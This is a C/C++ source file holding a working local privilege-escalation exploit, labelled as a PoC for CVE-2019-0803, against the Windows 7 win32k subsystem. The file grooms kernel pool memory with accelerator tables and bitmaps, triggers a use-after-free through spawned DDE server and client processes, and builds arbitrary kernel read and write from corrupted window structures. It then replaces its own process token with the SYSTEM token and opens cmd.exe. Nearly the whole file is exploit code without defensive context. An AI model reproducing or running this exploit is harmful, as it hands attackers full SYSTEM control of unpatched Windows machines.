#include "stdafx.h"

PSHAREDINFO gSharedInfo = NULL;

HWND    hwndIcon1 = NULL;
HWND    hwndIcon2 = NULL;
PBYTE   pwndIcon1 = NULL;
PBYTE   pwndIcon2 = NULL;

HWND    hwndMenu = NULL;

unsigned long long MySecTokenAddr = NULL;
unsigned long long MyEPROCESSAddr = NULL;

HDC     hdc = NULL;
HGDIOBJ hgdiObj = NULL;
PBYTE   pgdiObj = NULL;

HBITMAP hBitmap[1000] = { NULL };

static PBYTE   buffFakePal = NULL;
static LPACCEL buffAccTabl = NULL;

unsigned long long SystemSecurityTokenAddr = NULL;

static BOOL xxInitExploitInfo(VOID)
{
    gSharedInfo = (PSHAREDINFO)GetProcAddress(LoadLibraryA("user32"), "gSharedInfo");
    return TRUE;
}

static BOOL xxZeroIconWindow2strName(VOID)
{
	DWORD offset = (DWORD)((pwndIcon2 + OFFSET_STRNAME_WIN7) - (pwndIcon1 + LENGTH_TAGWND));

    DWORD dwori1 = GetWindowLong(hwndIcon1, offset + 0x0);
    DWORD dwori2 = GetWindowLong(hwndIcon1, offset + 0x4);
    DWORD dwori3 = GetWindowLong(hwndIcon1, offset + 0x8);
    DWORD dwori4 = GetWindowLong(hwndIcon1, offset + 0xC);

	SetWindowLongW(hwndIcon1, offset + 0x0, 0);
	SetWindowLongW(hwndIcon1, offset + 0x4, 0);
	SetWindowLongW(hwndIcon1, offset + 0x8, 0);
	SetWindowLongW(hwndIcon1, offset + 0xC, 0);

    WCHAR szPath[100] = {};
    GetWindowText(hwndIcon2, szPath, 100);
    printf("[*]text:%ws\n", szPath);

    if (wcslen(szPath) == 0)
    {
        SetWindowLongW(hwndIcon1, offset + 0x0, dwori1);
        SetWindowLongW(hwndIcon1, offset + 0x4, dwori2);
        SetWindowLongW(hwndIcon1, offset + 0x8, dwori3);
        SetWindowLongW(hwndIcon1, offset + 0xC, dwori4);
        return TRUE;
    }
    else
    {
        return FALSE;
    }
}

typedef struct _LARGE_UNICODE_STRING
{
    ULONG Length;           // 000
    ULONG MaximumLength : 31; // 004
    ULONG bAnsi : 1;          // 004
    PWSTR Buffer;           // 008
} LARGE_UNICODE_STRING, * PLARGE_UNICODE_STRING;

static BOOL WriteKernelAddress(UINT64 qwAddress, LPWSTR content)
{
    DWORD offset = (DWORD)((pwndIcon2 + OFFSET_STRNAME_WIN7) - (pwndIcon1 + LENGTH_TAGWND));

    //注:这里不要把LARGE_UNICODE_STRING的长度字段设置成0了
    //DWORD dwori1 = GetWindowLong(hwndIcon1, offset + 0x0);
    //DWORD dwori2 = GetWindowLong(hwndIcon1, offset + 0x4);
    DWORD dwori3 = GetWindowLong(hwndIcon1, offset + 0x8);
    DWORD dwori4 = GetWindowLong(hwndIcon1, offset + 0xC);

    //SetWindowLongW(hwndIcon1, offset + 0x0, 0);
    //SetWindowLongW(hwndIcon1, offset + 0x4, 0);
    SetWindowLongW(hwndIcon1, offset + 0x8, (qwAddress & 0xffffffff));
    SetWindowLongW(hwndIcon1, offset + 0xC, (qwAddress & 0xffffffff00000000) >> 32);

    SetWindowText(hwndIcon2, content);

    //SetWindowLongW(hwndIcon1, offset + 0x0, dwori1);
    //SetWindowLongW(hwndIcon1, offset + 0x4, dwori2);
    SetWindowLongW(hwndIcon1, offset + 0x8, dwori3);
    SetWindowLongW(hwndIcon1, offset + 0xC, dwori4);

    return TRUE;
}

static int ReadKernelAddress(UINT64 qwAddress)
{
    DWORD offset = (DWORD)((pwndIcon2 + OFFSET_SPWNDPARENT_WIN7) - (pwndIcon1 + LENGTH_TAGWND));

    DWORD dwori1 = GetWindowLong(hwndIcon1, offset + 0x0);
    DWORD dwori2 = GetWindowLong(hwndIcon1, offset + 0x4);

    SetWindowLongW(hwndIcon1, offset + 0x0, (qwAddress & 0xffffffff));
    SetWindowLongW(hwndIcon1, offset + 0x4, (qwAddress & 0xffffffff00000000) >> 32);

    unsigned int read = (int)GetAncestor(hwndIcon2, GA_PARENT);

    SetWindowLongW(hwndIcon1, offset + 0x0, dwori1);
    SetWindowLongW(hwndIcon1, offset + 0x4, dwori2);

    return read;
}

unsigned long long ReadPtrFromKernelMemory(unsigned long long addr) {
    unsigned int LowAddr = ReadKernelAddress(addr);
    unsigned int HighAddr = ReadKernelAddress(addr + 4);
    unsigned long long Addr = ((unsigned long long)HighAddr << 32) + LowAddr;
    return Addr;
}

typedef struct _HEAD
{
    HANDLE h;
    DWORD  cLockObj;
} HEAD, * PHEAD;

typedef struct _THROBJHEAD
{
    HEAD h;
    PVOID pti;
} THROBJHEAD, * PTHROBJHEAD;


typedef struct _THRDESKHEAD
{
    THROBJHEAD h;
    PVOID    rpdesk;
    PVOID       pSelf;   // points to the kernel mode address
} THRDESKHEAD, * PTHRDESKHEAD;


void FindSecurityTokens() {
    unsigned long long pti = (unsigned long long)(&((THRDESKHEAD*)pwndIcon1)->h.pti);
    printf("[*]Searching for current processes EPROCESS structure\n");

    unsigned long long ptiaddress = ReadPtrFromKernelMemory(pti);
    printf("\tptiaddress == %llx\n", ptiaddress);

    unsigned long long threadTagPointer = ReadPtrFromKernelMemory(ptiaddress);
    printf("\ttagTHREAD == %llx\n", threadTagPointer);

    unsigned long long kapcStateAddr = ReadPtrFromKernelMemory(threadTagPointer + OFFSET_APCADDR_WIN7);
    printf("\tkapc_stateAddr == %llx\n", kapcStateAddr);

    MyEPROCESSAddr = ReadPtrFromKernelMemory(kapcStateAddr + OFFSET_APCEPROCESS_WIN7);

    MySecTokenAddr = ReadPtrFromKernelMemory(MyEPROCESSAddr + OFFSET_SECTOKEN_WIN7);
    printf("\tOriginal security token pointer: 0x%llx\n", MySecTokenAddr);

    printf("[*]Searching for SYSTEM security token address\n");

    unsigned long long nextProc = ReadPtrFromKernelMemory(MyEPROCESSAddr + OFFSET_EPROCESSBLINK_WIN7) - OFFSET_EPROCESSBLINK_WIN7;
    printf("\tNext eprocess address: 0x%llx\n", nextProc);

    unsigned int pid = ReadKernelAddress(nextProc + OFFSET_EPROCESSPID_WIN7);
    printf("\tFound pid: 0x%X\n", pid);

    while (true) {
        nextProc = ReadPtrFromKernelMemory(nextProc + OFFSET_EPROCESSBLINK_WIN7) - OFFSET_EPROCESSBLINK_WIN7;
        printf("\tNext eprocess address: 0x%llx\n", nextProc);

        pid = ReadKernelAddress(nextProc + OFFSET_EPROCESSPID_WIN7);
        printf("\tFound pid: 0x%X\n", pid);
        //Step 9.2
        if (pid == 4) {
            printf("\ttarget process found!\n");
            SystemSecurityTokenAddr = ReadPtrFromKernelMemory(nextProc + OFFSET_SECTOKEN_WIN7);
            break;
        }
    }
}

static BOOL xxCreateIconWindowEx(VOID)
{
	// icon
	HWND hwnd1 = CreateWindowExW(0,
		L"#32772",
		NULL,
		WS_MINIMIZE | WS_DISABLED,
		0,
		0,
		0,
		0,
		NULL,
		NULL,
		NULL,
		NULL);
	// icon
	HWND hwnd2 = CreateWindowExW(0,
		L"#32772",
		NULL,
		WS_MINIMIZE | WS_DISABLED,
		0,
		0,
		0,
		0,
		NULL,
		NULL,
		NULL,
		NULL);

	PSERVERINFO  psi = gSharedInfo->psi;
	PHANDLEENTRY phe = gSharedInfo->aheList;

	PBYTE pwnd1 = NULL;
	PBYTE pwnd2 = NULL;

	for (ULONG c = 0; c < psi->cHandleEntries; c++)
	{
		if ((HWND)(c | (((ULONG_PTR)phe[c].wUniq) << 16)) == hwnd1)
		{
			pwnd1 = (PBYTE)phe[c].phead;
			break;
		}
	}
	for (ULONG c = 0; c < psi->cHandleEntries; c++)
	{
		if ((HWND)(c | (((ULONG_PTR)phe[c].wUniq) << 16)) == hwnd2)
		{
			pwnd2 = (PBYTE)phe[c].phead;
			break;
		}
	}
	if (pwnd1 <= pwnd2)
	{
		pwndIcon1 = pwnd1;
		hwndIcon1 = hwnd1;
		pwndIcon2 = pwnd2;
		hwndIcon2 = hwnd2;
	}
	else
	{
		pwndIcon1 = pwnd2;
		hwndIcon1 = hwnd2;
		pwndIcon2 = pwnd1;
		hwndIcon2 = hwnd1;
	}
	printf("[+]WND1: %p, WND2: %p\n", pwndIcon1, pwndIcon2);
	return TRUE;
}

static BOOL xxTriggerExploitEx(VOID)
{
	DWORD count = 0;

	HACCEL hAccel1[1000] = { NULL };
	HACCEL hAccel2[1000] = { NULL };

	for (UINT i = 0; i < 200; i++)
	{
        //用来塞内存空隙，确保0x350大小的内存碎片间隙刚好被填满，避免后续Bitmap和DIB占坑出现问题
		LPACCEL Entries = (LPACCEL)malloc(132 * sizeof(Entries));
		for (UINT i = 0; i < 132; i++)
		{
            Entries[i].fVirt = FCONTROL;
            Entries[i].key = 0x1234;
            Entries[i].cmd = 0x4444;
		}
		hAccel1[i] = NtUserCreateAcceleratorTable(Entries, 132);
		if (hAccel1[i] == NULL)
		{
			break;
		}
	}

    //用来占坑
	for (UINT i = 0; i < 1000; i++)
	{
		LPACCEL Entries = (LPACCEL)malloc(533 * sizeof(Entries));
		for (UINT i = 0; i < 533; i++)
		{
            Entries[i].fVirt = FCONTROL;
            Entries[i].key = 0x1234;
            Entries[i].cmd = 0x4444;
		}
		hAccel2[i] = NtUserCreateAcceleratorTable(Entries, 533);
	}
	for (UINT i = 0; i < 400; i++)
	{
		hBitmap[i] = CreateBitmap(16, 16, 1, 8, NULL);
		if (hBitmap[i] == NULL)
		{
			break;
		}
	}
	hwndMenu = CreateWindowExW(WS_EX_DLGMODALFRAME | WS_EX_LEFTSCROLLBAR | WS_EX_NOINHERITLAYOUT | WS_EX_LAYOUTRTL | WS_EX_COMPOSITED,
		L"#32768",
		L"bar",
		0x43A | WS_MAXIMIZEBOX | WS_VSCROLL | WS_CAPTION | WS_MAXIMIZE,
		58,
		18,
		60,
		-23,
		NULL,
		NULL,
		NULL,
		NULL);
	NtUserShowWindow(hwndMenu, 0);
	UpdateWindow(hwndMenu);

	PAINTSTRUCT paint = { 0 };
	hdc = NtUserBeginPaint(hwndMenu, &paint);
	hgdiObj = GetCurrentObject(hdc, OBJ_BITMAP);

	pgdiObj = *(PBYTE *)((*(PBYTE *)((*(PBYTE *)(__readgsqword(0x30) + 0x60)) + 0xF8)) + sizeof(HANDLEENTRY) * (WORD)(DWORD_PTR)hgdiObj);

	for (UINT i = 400; i < 800; i++)
	{
		hBitmap[i] = CreateBitmap(16, 16, 1, 8, NULL);
		if (hBitmap[i] == NULL)
		{
			break;
		}
	}

	for (UINT i = 0; i < 1000; i++)
	{
		PBYTE  pacc = NULL;
		HACCEL hacc = hAccel2[i];
		PHANDLEENTRY phe = gSharedInfo->aheList;
		for (UINT c = 0; c < gSharedInfo->psi->cHandleEntries; c++)
		{
			if ((HACCEL)(c | (((ULONG_PTR)phe[c].wUniq) << 16)) == hacc)
			{
				pacc = (PBYTE)phe[c].phead;
				break;
			}
		}
		if (pgdiObj == pacc + 0xCB0)
		{
			Sleep(1000);
			return TRUE;
		}
	}

	return FALSE;
}

static VOID xxBuildGlobalAccTableEx(PVOID pcbWndExtra)
{
	DWORD num = 0;
	if (buffFakePal == NULL)
	{
		buffFakePal = (PBYTE)malloc(0x98); // PALETTE
		ZeroMemory(buffFakePal, 0x98);
		*(PVOID *)(buffFakePal + 0x80) = pcbWndExtra;               //DBI对象中tagRGBQUAD地址修改为第一个窗口WndExtra的地址
		*(DWORD *)(buffFakePal + 0x1C) = 1; // PALETTE->cEntries
		*(PVOID *)(buffFakePal + 0x88) = &num;
	}
	if (buffAccTabl == NULL)
	{
		buffAccTabl = (LPACCEL)malloc(sizeof(ACCEL) * 132);
		ZeroMemory(buffAccTabl, sizeof(ACCEL) * 132);
	}

	for (UINT i = 0; i < 132; i++)
	{
        buffAccTabl[i].fVirt = FCONTROL;
        buffAccTabl[i].key = 0x1234;
        buffAccTabl[i].cmd = 0x4444;
	}
	buffAccTabl[11].key = 2;
	buffAccTabl[11].cmd = 0;
	buffAccTabl[12].fVirt = 0;
	buffAccTabl[12].key = 0;

	*(WORD *)&buffAccTabl[15].key = (WORD)((DWORD_PTR)buffFakePal);
	*(WORD *)&buffAccTabl[15].cmd = (WORD)((DWORD_PTR)buffFakePal >> 16);
	*(WORD *)&buffAccTabl[16].fVirt = (WORD)((DWORD_PTR)buffFakePal >> 32);
	*(WORD *)&buffAccTabl[16].key = (WORD)((DWORD_PTR)buffFakePal >> 48);
}

INT PocMain2()
{
	WCHAR szExePath[MAX_PATH] = { 0 };
	GetModuleFileNameW(NULL, szExePath, MAX_PATH);

	std::cout << "-------------------" << std::endl;
	std::cout << "POC - CVE-2019-0803" << std::endl;
	std::cout << "-------------------" << std::endl;

	DWORD times = 0;

	xxInitExploitInfo();
	xxCreateIconWindowEx();
    
    SetWindowText(hwndIcon2, L"abc");

	BOOL bReturn = FALSE;
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	si = { 0 };
	pi = { 0 };
	si.cb = sizeof(STARTUPINFO);
	bReturn = CreateProcessW(szExePath,
		(LPWSTR)L" DDEServer",
		NULL,
		NULL,
		FALSE,
		NULL,
		NULL,
		NULL,
		&si,
		&pi);
	if (!bReturn)
	{
		return 0;
	}

	do
	{
		printf("[+]trying %d times \r\n", times);
		if (xxTriggerExploitEx())
		{
            printf("[!]xxTriggerExploitEx Success \r\n");
			break;
		}
		NtUserDestroyWindow(hwndMenu);
	} while (++times < 10);

	HWND hwndSrever = NULL;
	do
	{
		hwndSrever = FindWindowW(NULL, L"DDEServerPoc");
	} while (hwndSrever == NULL && (Sleep(300), TRUE));

    //将之前获取到的GDI句柄传给DDEServer，用于之后句柄替换触发漏洞
	SendMessageW(hwndSrever, MSG_DDESERVER_SET_GDI_OBJ_ADDR, (WPARAM)hgdiObj, NULL);

    //getchar();
	si = { 0 };
	pi = { 0 };
	si.cb = sizeof(STARTUPINFO);
	bReturn = CreateProcessW(szExePath,
		(LPWSTR)L" DDEClient",
		NULL,
		NULL,
		FALSE,
		NULL,
		NULL,
		NULL,
		&si,
		&pi);
	if (!bReturn)
	{
		return 0;
	}

	HWND hwnd = NULL;

	do
	{
		hwnd = FindWindowW(NULL, L"DDEClientPoc");
	} while (hwnd == NULL && (Sleep(300), TRUE));

	printf("[+]hTriggerWindow %p\n", hwnd);

	for (UINT i = 0; i < 300; i++)
	{
		if (hBitmap[i] != NULL)
		{
			DeleteObject(hBitmap[i]);
			hBitmap[i] = NULL;
		}
	}

	xxBuildGlobalAccTableEx(pwndIcon1 + OFFSET_CBWNDEXTRA_WIN7);

	SendMessageW(hwnd, MSG_DDESERVER_EXIT, NULL, NULL);
	WaitForSingleObject(pi.hProcess, INFINITE);

	for (UINT i = 300; i < 700; i++)
	{
		if (hBitmap[i] != NULL)
		{
			DeleteObject(hBitmap[i]);
			hBitmap[i] = NULL;
		}
	}

	printf("[+]Wait\n");

	Sleep(8000);
	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);

	HACCEL hAcc[2000] = { NULL };
	for (UINT i = 0; i < 2000; i++)
	{
		hAcc[i] = NtUserCreateAcceleratorTable(buffAccTabl, 132); // UAF
		if (hAcc[i] == NULL)
		{
			break;
		}
	}

    RGBQUAD number = {};
    number.rgbBlue = 0x78;
    number.rgbGreen = 0x56;
    number.rgbRed = 0x34;

	if (SetDIBColorTable(hdc, 0, 1, (const RGBQUAD *)&number))
	{
        printf("[+]SetDIBColorTable OK\n");
	}

    if (xxZeroIconWindow2strName())
    {
        printf("[+]hTriggerWindow OK\n");
    }
    else
    {
        printf("[!]hTriggerWindow Failed\n");
        return 0;
    }

    FindSecurityTokens();
    wchar_t strSysSecToken[5] = { 0x00 };
    strSysSecToken[3] = (SystemSecurityTokenAddr >> 48) & 0xFFFF;
    strSysSecToken[2] = (SystemSecurityTokenAddr >> 32) & 0xFFFF;
    strSysSecToken[1] = (SystemSecurityTokenAddr >> 16) & 0xFFFF;
    strSysSecToken[0] = (SystemSecurityTokenAddr >> 0) & 0xFFFF;
    printf("[+]Security token to steal: 0x%llx\n", SystemSecurityTokenAddr);

    WriteKernelAddress(MyEPROCESSAddr + OFFSET_SECTOKEN_WIN7, strSysSecToken);

    printf("Run Cmd...\n");
    system("cmd.exe");

	return 0;
}
INT DDEServer();
INT DDEClient();
INT main(int argc, char *argv[])
{
	if (argc == 1)
	{
		PocMain2();
		return 0;
	}

	if (argc != 2)
	{
		return -1;
	}

	if (strcmp(argv[1], "DDEServer") == 0)
	{
		DDEServer();
	}
	else if (strcmp(argv[1], "DDEClient") == 0)
	{
		DDEClient();
	}



	return 0;
}
